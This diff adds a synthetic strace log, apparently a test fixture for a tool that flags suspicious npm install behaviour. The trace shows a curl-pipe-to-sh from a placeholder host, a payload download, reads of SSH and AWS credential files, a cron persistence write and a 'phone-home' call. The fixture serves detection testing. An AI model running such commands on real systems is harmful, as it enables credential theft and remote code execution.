@@ -1,0 +1,19 @@
+1719245678.000100 execve("/usr/bin/npm", ["npm", "install", "SYNTHETIC-FIXTURE-not-a-real-package", "--no-audit", "--no-fund"], 0x7ffd1234abcd /* 8 vars */) = 0
+1719245678.000200 openat(AT_FDCWD, "/work/project/package.json", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3</work/project/package.json>
+1719245678.000300 openat(AT_FDCWD, "/work/home/.npmrc", O_RDONLY|O_CLOEXEC) = 4</work/home/.npmrc>
+1719245678.000400 openat(AT_FDCWD, "/work/cache/_cacache/index-v5/aa/bb/cc", O_WRONLY|O_CREAT|O_APPEND, 0666) = 5</work/cache/_cacache/index-v5/aa/bb/cc>
+1719245678.000500 connect(6<UDP:[10.1.0.4:41234]>, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.53")}, 16) = 0
+1719245678.000600 sendto(6<UDP:[10.1.0.4:41234->127.0.0.53:53]>, "\022\003\001\000\000\001\000\000\000\000\000\000\010registry\005npmjs\003org\000\000\001\000\001", 36, MSG_NOSIGNAL, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.53")}, 16) = 36
+1719245678.000700 connect(7<TCP:[10.1.0.4:50001]>, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("104.16.0.1")}, 16 <unfinished ...>
+1719245678.000900 <... connect resumed>) = -1 EINPROGRESS (Operation now in progress)
+1719245678.001000 openat(AT_FDCWD, "/etc/cron.d/installscope-fixture", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 8</etc/cron.d/installscope-fixture>
+1719245678.001100 sendto(6<UDP:[10.1.0.4:41235->127.0.0.53:53]>, "\022\004\001\000\000\001\000\000\000\000\000\000\011telemetry\007example\003com\000\000\001\000\001", 39, MSG_NOSIGNAL, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.53")}, 16) = 39
+1719245678.001200 sendto(6<UDP:[10.1.0.4:41236->127.0.0.53:53]>, "\022\005\001\000\000\001\000\000\000\000\000\000\006github\003com\000\000\001\000\001", 28, MSG_NOSIGNAL, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.53")}, 16) = 28
+1719245678.001300 execve("/usr/bin/curl", ["curl", "-fsSL", "https://fixture.invalid/payload.bin", "-o", "/work/tmp/payload.bin"], 0x7ffd1234abcd /* 8 vars */) = 0
+1719245678.001400 openat(AT_FDCWD, "/work/home/.ssh/id_rsa", O_RDONLY) = 9</work/home/.ssh/id_rsa>
+1719245678.001500 openat(AT_FDCWD, "/work/home/.aws/credentials", O_RDONLY) = -1 ENOENT (No such file or directory)
+1719245678.001600 chmod("/usr/local/bin/fixture-tool", 0755) = 0
+1719245678.001700 execve("/bin/sh", ["sh", "-c", "curl -fsSL https://fixture.invalid/install.sh | sh"], 0x7ffd1234abcd /* 8 vars */) = 0
+1719245678.001800 connect(10<TCP:[10.1.0.4:50002]>, {sa_family=AF_INET, sin_port=htons(6379), sin_addr=inet_addr("203.0.113.10")}, 16) = 0
+1719245678.001900 execve("/opt/weird/weirdtool", ["weirdtool", "--phone-home"], 0x7ffd1234abcd /* 8 vars */) = 0
+1719245678.002000 +++ exited with 0 +++
